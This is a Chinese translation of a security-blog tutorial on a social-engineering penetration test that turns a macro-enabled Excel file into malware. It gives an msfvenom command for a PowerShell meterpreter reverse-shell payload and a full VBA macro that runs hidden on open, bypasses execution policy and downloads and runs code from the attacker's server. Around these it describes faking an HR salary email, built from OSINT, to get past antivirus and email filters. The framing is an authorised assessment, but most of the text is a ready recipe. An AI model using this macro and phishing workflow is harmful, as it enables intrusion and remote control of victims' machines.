
# 【技术分享】社会工程学攻击之看我如何用office文档欺骗用户


                                阅读量   
                                **101084**
                            
                        |
                        
                                                                                                                                    ![](./img/85988/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：infosecinstitute.com
                                <br>原文地址：[http://resources.infosecinstitute.com/social-engineering-compromising-users-using-office-document/](http://resources.infosecinstitute.com/social-engineering-compromising-users-using-office-document/)

译文仅供参考，具体内容表达以及含义原文为准

[![](./img/85988/t016be8b69418d78b15.jpg)](./img/85988/t016be8b69418d78b15.jpg)



翻译：[**村雨其实没有雨**](http://bobao.360.cn/member/contribute?uid=2671379114)

预估稿费：160RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**前言**

最近的趋势表明，社会工程学才是黑客们最普遍采用的攻击社会组织的手段，其中也不乏一些大公司被社会工程学手段入侵的案例。雇员们很容易被攻击者诱导着点击某些链接，打开某些看起来非常诱人的office文档，最终才发现其实是恶意程序。大家都知道，绕过反病毒软件的防护其实轻而易举。

在本文中，我们将会了解到如何创建一个能够绕过反病毒软件特征码检测和启发式检测的office恶意文档，最终通过打开该文档我们能够获得一个meterpreter反向连接的shell。

在我介绍如何绕过反病毒软件之前，我们需要来先了解一下反病毒软件是如何运作的。在高等级的防护下，反病毒软件主要采用两种手段来检测恶意程序：

**1. 基于签名和特征的检测。这种手段只能检测保存在硬盘上的恶意程序。反病毒软件会读取文件，并将其特征码与病毒库进行比对。反病毒软件会自带一个很大的病毒库，其中包括了许多已知的病毒特征，反病毒程序会分析文件是否和其中的特征相匹配。这种方法相对较快，并且耗费的运算资源较少。**

**2. 基于启发式的检测。这种检测方法通常也会与基于特征码的检测方法相结合。反病毒软件会检测待检测程序的行为，来判断它是否在执行恶意活动。这种方法通常是通过将程序置于沙箱观察一段时间实现的，例如它会检测是否会以特定的方式写入内存，或者是否会立即打开一个通道对外建立连接。这种方法的优点是能够检测出未知的恶意程序，但是这是以性能为代价的，因此，在实施启发性分析的时候，厂商必须要在安全性和可用性之间做出妥协。******

反病毒软件并不善于检测内存中运行的程序，因此我们的目标就是把恶意程序在内存中运行。

<br>

**攻击场景**

这种攻击手段的应用场景应该是在我们需要对一个公司进行社会工程学评估的时候。攻击的第一步应该是获得目标的最初立足点。通过使用OSINT技术，我们能够获得以下信息：

**1. 目标公司运行赛门铁克反病毒程序**

**2. 该公司提供医疗保险**

**3. 在本月公司员工会获得福利**

OSINT，是指从各种公开的信息资源中寻找和获取有价值的情报。在这种方法的指导下，我们使用了以下手段收集到了信息：

**1. 在LinkedIn了解到公司使用了赛门铁克反病毒程序**

**2. 在Glassdoor了解到公司提供医疗保险以及福利发放时间**

利用已经收集到的信息，我们计划找个借口来冒充HR，因此我们也需要伪造一封他/她的邮件。

我们会使用一个支持宏的Microsoft Excel文档，然后通过宏来下载和执行基于powershell的meterpreter攻击载荷。由于Microsoft进程已经在内存中运行了，它会为攻击载荷分配出一段内存空间而不会写入磁盘。

让我先来简要列出完成目标所需要的步骤：

生成powershell反射攻击载荷(reflection payload)并启动监听程序

打开excel文件并写入宏，用于下载和执行攻击载荷

将文件另存为启用宏的文档

现在让我们详细介绍每一步：

**1.生成powershell反射攻击载荷**

我们选择反射攻击载荷是因为它不会像其他powershell payload一样在目标计算机上产生临时文件。一切都会通过.NET反射加载，所以它不需要产生一个用于动态编译的.cs临时文件。

命令如下

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.1.130 LPORT=443 -f psh-reflection &gt; /var/www/html/shellcode.ps1
```

[![](./img/85988/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01c118f94aeeaf98cc.png)

**2.创建恶意文档**

**a.选择"视图" → "查看宏"**

[![](./img/85988/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01dd5235b22eaa3fb7.png)

**b.创建宏 – 输入宏名并创建**

[![](./img/85988/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01369c210f1acba764.png)

**c.删除自动生成的代码并粘贴以下的代码**



```
Sub Execute()
Dim payload
payload = “powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString(‘http://10.1.1.130/shellcode.ps1’));”
Call Shell(payload, vbHide)
End Sub
Sub Auto_Open()
Execute
End Sub
Sub Workbook_Open()
Execute
End Sub
```

(这是使用powershell渗透测试框架nishang生成的代码)

下面我们来简要介绍一下上述代码的作用：

**1. powershell.exe – 用于执行powershell**

**2. WindowStyle hidden – 创建执行命令时不显示窗口的powershell程序**

**3. ExecutionPolicy Bypass – 默认情况下会阻止windows系统中powershell脚本的运行，因此为了执行脚本，我们应该将运行策略设为Bypass**

**4. NoLogo – 在启动时隐藏头部的版权信息**

**5. NoProfile – 不加载Windows PowerShell配置文件**

**6. -c – 简写，等同于Command**

**7. IEX ((New-Object Net.WebClient).DownloadString(‘http://10.1.1.130/shellcode.ps1’) – 从攻击者的服务器上下载shellcode并运行**

**8. Auto_Open() and Workbook_Open() – 在文件打开时立即运行宏**

**然后保存宏即可，我使用的文件名是new_salary_structure_2017**

下面我们要将这个恶意文档通过邮件寄给目标公司。值得一提的是，这种攻击方法同样会绕过大多数电子邮件网关和电子邮件保护机制，因为里面并没有包含恶意代码。

将邮件寄给任何具有公开可用电子邮件服务商的用户是一个良好的测试手段，我们能够用这种方法来检测邮件是否会被标记为恶意。

您可以看到，我们成功的在邮箱收到了带有附件的邮件

[![](./img/85988/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01dff8a19534d0ae10.png)

这封诱人的邮件提到了薪水结构，任何员工最终都会打开excel文档

[![](./img/85988/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a3d709f15cb66e39.png)

可以看到，在他打开后，我们成功收到了一个meterpreter反向shell，IP是10.1.1.129，从屏幕截图可以看到这台机器正在运行赛门铁克反病毒程序。

现在我们已经在这家公司的网络中找到了一个立足点，我们可以继续实施下一步的攻击。
